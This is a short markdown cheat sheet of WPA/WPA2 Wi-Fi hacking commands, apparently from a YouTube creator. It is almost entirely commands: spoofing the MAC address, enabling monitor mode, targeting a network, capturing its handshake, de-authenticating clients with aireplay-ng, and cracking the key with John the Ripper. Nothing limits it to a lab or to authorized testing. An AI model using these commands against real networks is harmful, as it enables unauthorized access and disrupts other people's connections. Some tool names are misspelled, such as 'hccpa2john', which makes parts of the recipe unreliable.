# Wifi Hacking Quick Commands `WPA/WAP2`
Kill Network Manager
```
airmon-ng check kill
```
Changing MAC Address
```
ifconfig wlan1 down
ifconfig wlan1 hw ether 00:11:22:33:44:55
ifconfig wlan1 up
```
Enable Monitor Mode
```
ifconfig wlan1 down
airmon-ng start wlan1
ifconfig wlan1 up
```
<br/>

## WPA/WPA2 Key Cracking
Scan Network
```
airodump-ng --band abg wlan1
```
Scan Taget Network
```
airodump-ng --bssid {} --channel {} wlan1
```
Capture `WPA Handshake`
```
airodump-ng --bssid {} --channel {} --write {} wlan1
```
De-authentication Attack
```
aireplay-ng --deauth 5 -a {} -c {} wlan1
```
`.cap` ===}> `.hccap` 
```
aircrack-ng {} -J {extension_name_not_required}
```
`.hccap` ===}> `.txt` 
```
hccpa2john {} > {}
```
Crack the Key using `John-the-riper` tool
```
john {}
```
---
---
---
Disable Monitor Mode
```
ifconfig wlan1 down
airmon-ng stop wlan1
ifconfig wlan1 up
```
Restart Network Manager
```
systemctl restart NetworkManager
```

# =}> [Keep Supporting me on YouTube](https://www.youtube.com/@ohm_vishwa)